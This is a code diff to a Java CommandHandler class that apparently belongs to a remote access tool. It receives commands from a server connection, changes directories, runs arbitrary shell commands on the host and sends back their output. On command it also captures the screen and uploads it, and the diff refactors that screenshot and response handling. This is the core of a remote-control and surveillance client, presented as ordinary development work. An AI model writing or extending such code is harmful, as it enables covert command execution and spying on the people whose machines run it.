@@ -6,10 +6,12 @@ import java.util.concurrent.TimeUnit;
 public class CommandHandler {
 
     private final ServerConnection serverConnection;
+    private final ScreenShot screenShot;
     private String currentDir = System.getProperty("user.dir");
 
     public CommandHandler(ServerConnection serverConnection) {
         this.serverConnection = serverConnection;
+        this.screenShot = new ScreenShot();
     }
 
     public void handleCommands() throws IOException {
@@ -25,14 +27,17 @@ public class CommandHandler {
             if (command.startsWith("cd ")) {
                 fullResponse.append(changeDirectory(command.substring(3).trim()));
             } else if (command.equalsIgnoreCase("screenshot")) {
-                sendScreenShot();
+                byte[] imageBytes = screenShot.imageBytes();
+                if (imageBytes != null && imageBytes.length > 0) {
+                    serverConnection.sendScreenShot(imageBytes);
+                }
                 continue;
             } else {
                 fullResponse.append(executeCommand(command));
             }
-
-            serverConnection.sendResponse(fullResponse.toString().trim());
-            serverConnection.sendResponse("End");
+            if (fullResponse.length() > 0) {
+                serverConnection.sendResponse(fullResponse.toString().trim());
+            }
         }
     }
 
@@ -51,18 +56,6 @@ public class CommandHandler {
             }
         } catch (IOException e) {
             return "Error: Unable to change directory - " + e.getMessage();
-        }
-    }
-
-    private void sendScreenShot() {
-        ScreenShot screenShot = new ScreenShot();
-        byte[] imageBytes = screenShot.imageBytes();
-        if (imageBytes.length > 0) {
-            System.out.println("[DEBUG] Sending screenshot of size: " + imageBytes.length + " bytes");
-            serverConnection.sendScreenShot(imageBytes);
-        } else {
-            System.err.println("[ERROR] Screenshot capture failed.");
-            serverConnection.sendResponse("Error: Failed to capture screenshot.");
         }
     }
 
